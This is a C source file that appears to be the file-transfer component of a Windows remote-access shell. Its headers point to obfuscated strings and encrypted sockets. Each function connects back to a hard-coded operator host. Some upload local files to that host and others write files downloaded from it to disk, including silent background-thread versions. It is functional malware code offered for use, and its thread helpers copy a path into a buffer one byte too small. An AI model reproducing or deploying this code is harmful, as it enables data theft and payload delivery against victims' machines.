#include <stdio.h>
#include <ws2tcpip.h>
#include "main.h"
#include "cry_socket.h"

#include "shell_obf.h"

int sendFile(SOCKET mainCallback, const char* filePath) {
	
	sendE(mainCallback, SHELL_STRING_SENDRECV_MSG_CONNECT, strlen(SHELL_STRING_SENDRECV_MSG_CONNECT), 0);
	
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		sendE(mainCallback, SHELL_STRING_SENDRECV_ERROR_SOCKET, strlen(SHELL_STRING_SENDRECV_ERROR_SOCKET), 0);
		closesocket(sock);
		return 0;
	}
	
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr)); // can use ZeroMemory
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(SHELL_STRING_HOST_IP);
	addr.sin_port = htons(HOST_PORT_SENDRECV);
	
	if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		sendE(mainCallback, SHELL_STRING_SENDRECV_ERROR_CONNECT, strlen(SHELL_STRING_SENDRECV_ERROR_CONNECT), 0);
		closesocket(sock);
		return 0;
	}
	
	FILE* f = fopen(filePath, "rb");
	if (!f) {
		sendE(mainCallback, SHELL_STRING_SENDRECV_ERROR_FOPEN, strlen(SHELL_STRING_SENDRECV_ERROR_FOPEN), 0);
		closesocket(sock);
		return 0;
	}
	
	sendE(mainCallback, SHELL_STRING_SENDRECV_MSG_SENDING, strlen(SHELL_STRING_SENDRECV_MSG_SENDING), 0);

	// get file size
	fseek(f, 0L, SEEK_END);
	long fileSize = ftell(f);
	fseek(f, 0L, SEEK_SET);
	
	// send data (file)
	char buff[KSIZ] = {0};
	int result = 0;
	size_t total = 0;
	int lastp = 0;
	while ((result = fread(buff, 1, KSIZ, f)) > 0) {
		int r = 0;
		if ((r = sendE(sock, buff, result, 0)) == SOCKET_ERROR) {
			sendE(mainCallback, SHELL_STRING_SENDRECV_ERROR_SEND, strlen(SHELL_STRING_SENDRECV_ERROR_SEND), 0);
			fclose(f);
			closesocket(sock);
			return 0;
		}
		total += r;
		
		//* PRINT INFO
		char msg[SMALLSIZ] = {0};
		int p = ((float)total / (float)fileSize * 100.0f);
		if (p != lastp) {
			lastp = p;
			#ifdef _WIN64
				sprintf(msg, "> %d %% (%lld/%ld)\n", p, total, fileSize);
			#else
				sprintf(msg, "> %d %% (%d/%ld)\n", p, total, fileSize);
			#endif
			sendE(mainCallback, msg, strlen(msg), 0);
		}
		//*/
	}
	/* PRINT INFO
	char msg[] = "\n";
	sendE(mainCallback, msg, strlen(msg), 0);
	//*/
	
	fclose(f);
	closesocket(sock);

	sendE(mainCallback, SHELL_STRING_SENDRECV_MSG_COMPLETED, strlen(SHELL_STRING_SENDRECV_MSG_COMPLETED), 0);

	return 1;
}

int recvFile(SOCKET mainCallback, const char* filePath) {
	
	sendE(mainCallback, SHELL_STRING_SENDRECV_MSG_CONNECT, strlen(SHELL_STRING_SENDRECV_MSG_CONNECT), 0); // send conn msg
		
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		sendE(mainCallback, SHELL_STRING_SENDRECV_ERROR_SOCKET, strlen(SHELL_STRING_SENDRECV_ERROR_SOCKET), 0);
		closesocket(sock);
		return 0;
	}
	
	// set timeout (can't use WSASocket() must use socket())
	DWORD timeout = RECV_TIMEOUT;
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
	
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr)); // can use ZeroMemory
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(SHELL_STRING_HOST_IP);
	addr.sin_port = htons(HOST_PORT_SENDRECV);
	
	if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		sendE(mainCallback, SHELL_STRING_SENDRECV_ERROR_CONNECT, strlen(SHELL_STRING_SENDRECV_ERROR_CONNECT), 0);
		closesocket(sock);
		return 0;
	}
	
	FILE* f = fopen(filePath, "wb");
	if (!f) {
		sendE(mainCallback, SHELL_STRING_SENDRECV_ERROR_FOPEN, strlen(SHELL_STRING_SENDRECV_ERROR_FOPEN), 0);
		closesocket(sock);
		return 0;
	}

	sendE(mainCallback, SHELL_STRING_SENDRECV_MSG_RECVING, strlen(SHELL_STRING_SENDRECV_MSG_RECVING), 0);
	
	char buff[KSIZ] = {0};
	int result = 0;
	size_t total = 0;
	while ((result = recvE(sock, buff, KSIZ, 0)) > 0) {
		fwrite(buff, sizeof(char), result, f);
		total += result;
		
		/* PRINT INFO
		char msg[SMALLSIZ] = {0};
		#ifdef _WIN64
			sprintf(msg, "\rrecv: %lld", total);
		#else
			sprintf(msg, "\rrecv: %d", total);
		#endif
		sendE(mainCallback, msg, strlen(msg), 0);
		//*/
	}
	/* PRINT INFO
	char msg[] = "\n";
	sendE(mainCallback, msg, strlen(msg), 0);
	//*/
	
	fclose(f);
	closesocket(sock);

	sendE(mainCallback, SHELL_STRING_SENDRECV_MSG_COMPLETED, strlen(SHELL_STRING_SENDRECV_MSG_COMPLETED), 0);
	
	return 1;
}

static DWORD WINAPI sendFile_bg_thread(void* data) {
	
	DPL("sfbg - begin");
	
	char* filePath_ = (char*)data;
	int fl = strlen(filePath_);
	char filePath[fl];
	memset(filePath, 0, fl);
	strcpy(filePath, filePath_);
	free(filePath_);
	
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		DPL("sfbg - socket -> INVALID_SOCKET");
		return 0;
	}
	
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr)); // can use ZeroMemory
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(SHELL_STRING_HOST_IP);
	addr.sin_port = htons(HOST_PORT_SENDRECV);
	
	if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		DPL("sfbg - failed to connect");
		closesocket(sock);
		return 0;
	}
	
	FILE* f = fopen(filePath, "rb");
	if (!f) {
		DPL("sfbg - failed to open file");
		closesocket(sock);
		return 0;
	}
	
	// send data (file)
	char buff[KSIZ] = {0};
	int result = 0;
	while ((result = fread(buff, 1, KSIZ, f)) > 0) {
		if (sendE(sock, buff, result, 0) == SOCKET_ERROR) {
			DPL("sfbg - send -> SOCKET_ERROR");
			fclose(f);
			closesocket(sock);
			return 0;
		}
	}
	
	fclose(f);
	closesocket(sock);
	
	DPL("sfbg - end");
	return 1;
}
HANDLE sendFile_bg(const char* filePath) {
	return CreateThread(NULL, 0, sendFile_bg_thread, (void*)strdup(filePath), 0, NULL);
}

DWORD WINAPI recvFile_bg_thread(void* data) {
	
	DPL("rfbg - begin");
	
	char* filePath_ = (char*)data;
	int fl = strlen(filePath_);
	char filePath[fl];
	memset(filePath, 0, fl);
	strcpy(filePath, filePath_);
	free(filePath_);
	
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		DPL("rfbg - socket -> INVALID_SOCKET");
		return 0;
	}
	
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr)); // can use ZeroMemory
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(SHELL_STRING_HOST_IP);
	addr.sin_port = htons(HOST_PORT_SENDRECV);
	
	// set timeout (can't use WSASocket() must use socket())
	DWORD timeout = RECV_TIMEOUT;
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
	
	if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		DPL("rfbg - failed to connect");
		closesocket(sock);
		return 0;
	}
	
	FILE* f = fopen(filePath, "wb");
	if (!f) {
		DPL("rfbg - failed to open file");
		closesocket(sock);
		return 0;
	}
	
	char buff[KSIZ] = {0};
	int result = 0;
	while ((result = recvE(sock, buff, KSIZ, 0)) > 0) {
		fwrite(buff, sizeof(char), result, f);
	}
	
	fclose(f);
	closesocket(sock);
	DPL("rfbg - end");
	return 1;
}
HANDLE recvFile_bg(const char* filePath) {
	return CreateThread(NULL, 0, recvFile_bg_thread, (void*)strdup(filePath), 0, NULL);
}
